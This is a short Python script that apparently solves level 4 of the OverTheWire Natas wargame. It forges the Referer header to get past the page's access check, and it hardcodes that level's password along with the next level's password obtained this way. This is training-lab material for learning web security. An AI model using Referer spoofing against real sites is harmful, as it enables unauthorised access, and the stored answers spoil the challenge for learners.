import requests,re


username="natas4"
password="Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

url=str("http://%s.natas.labs.overthewire.org" %username)
headers={"Referer":"http://natas5.natas.labs.overthewire.org/"}

r=requests.get(url,auth=(username,password),headers=headers)

print(r.text)

#Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
